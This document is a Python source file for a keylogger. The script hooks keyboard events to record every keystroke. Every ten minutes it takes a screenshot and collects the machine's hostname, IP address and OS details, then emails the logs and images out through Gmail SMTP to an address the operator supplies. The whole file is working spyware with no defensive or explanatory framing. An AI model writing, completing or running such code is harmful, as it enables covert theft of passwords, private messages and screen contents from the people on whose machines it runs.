import keyboard
import socket
import os
import platform
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from threading import Semaphore, Timer
import pyscreenshot as ImageGrab

SEND_REPORT_EVERY = 600
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
        # with open("output.txt", "w+") as output:
        #   output.write(self.log)

    @staticmethod
    def sendmail(email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    @staticmethod
    def SendImage(ImgFileName):
        img_data = open(ImgFileName, 'rb').read()
        msg = MIMEMultipart()
        msg['Subject'] = 'Screenshot'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS

        text = MIMEText("test")
        msg.attach(text)
        image = MIMEImage(img_data, name=os.path.basename(ImgFileName))
        msg.attach(image)

        s = smtplib.SMTP(host="smtp.gmail.com", port=587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        s.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
        s.quit()

    def screenshot(self):
        im = ImageGrab.grab()
        cwd = os.getcwd()
        path = cwd + "/" + "screenshot.png"
        im.save(path)
        self.SendImage(path)
        os.remove(path)

    def report(self):
        self.screenshot()

        if self.log:
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def computer_info(self):
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        mssg = "Information of the system\n"

        mssg += "Architecture - " + platform.architecture()[0] + " " + platform.architecture()[1]
        mssg += "\nMachine - " + platform.machine()
        mssg += "\nSystem - " + platform.system() + "\n" + platform.version() + "\n"
        mssg += "Hostname - " + hostname + "\n"
        mssg += "IP Address - " + IPAddr + "\n"

        with open("output2.txt", "w+") as output2:
            output2.write(mssg)

        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, mssg)

    def start(self):

        keyboard.on_release(callback=self.callback)
        self.computer_info()
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
